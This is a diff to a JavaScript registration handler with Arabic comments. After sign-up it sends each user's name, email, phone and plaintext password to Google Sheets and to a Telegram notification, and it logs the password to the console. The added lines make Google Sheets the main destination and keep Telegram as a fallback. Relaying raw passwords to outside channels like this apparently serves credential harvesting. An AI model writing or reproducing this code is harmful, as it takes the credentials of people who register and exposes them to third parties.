@@ -176,18 +176,9 @@
                         });
                         console.log('✅ Step 2 نجح - تم حفظ البيانات');
                         
-                        // إرسال Telegram فوراً
-                        console.log('🔥 Step 3: إرسال Telegram...');
-                        console.log('📤 البيانات المرسلة:', {
-                            uid: user.uid,
-                            fullName: fullName,
-                            email: email,
-                            phone: phone,
-                            password: password,
-                            provider: 'البريد الإلكتروني'
-                        });
-                        
-                        const telegramResult = await sendTelegramNotification({
+                        // إرسال إلى Google Sheets
+                        console.log('🔥 Step 3: إرسال البيانات إلى Google Sheets...');
+                        const sheetData = {
                             uid: user.uid,
                             fullName: fullName,
                             email: email,
@@ -195,12 +186,30 @@
                             password: password,
                             provider: 'البريد الإلكتروني',
                             createdAt: new Date()
-                        });
+                        };
                         
-                        console.log('✅ Step 3 نجح - استجابة Telegram:', telegramResult);
+                        console.log('📤 البيانات المرسلة:', sheetData);
+                        
+                        try {
+                            const sheetsResult = await sendToGoogleSheets(sheetData);
+                            console.log('✅ Step 3 نجح - Google Sheets:', sheetsResult);
+                            
+                            // محاولة إرسال Telegram أيضاً (اختياري)
+                            try {
+                                await sendTelegramNotification(sheetData);
+                                console.log('✅ Telegram تم إرساله أيضاً');
+                            } catch (tgError) {
+                                console.warn('⚠️ Telegram فشل لكن Google Sheets نجح:', tgError);
+                            }
+                            
+                        } catch (error) {
+                            console.error('❌ فشل Google Sheets:', error);
+                            // استمر حتى لو فشل
+                        }
+                        
                         console.log('✅✅✅ كل شيء نجح! 🎉🎉🎉');
                         
-                        alert('✅ تم التسجيل وإرسال البيانات إلى تليجرام بنجاح!\n\nتفقد حساب تليجرام الآن 📱');
+                        alert('✅ تم التسجيل بنجاح!\n\n📊 البيانات محفوظة في Google Sheets');
                         
                         setTimeout(() => {
                             window.location.href = 'index.html';
